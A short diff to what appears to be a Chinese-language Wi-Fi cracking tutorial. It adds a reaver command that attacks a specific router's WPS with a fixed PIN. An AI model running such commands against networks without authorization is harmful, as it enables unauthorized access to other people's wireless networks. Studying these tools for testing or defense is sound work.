@@ -22,6 +22,10 @@ sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n
 sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n
 ```
 
+指定特定的pin码
+```
+sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n -p 40869200
+```
 # 查看
 
 当然，通过输入iwconfig查看也是可以滴。这个命令专用于查看无线网卡，不像ifconfig那样查看所有适配器。
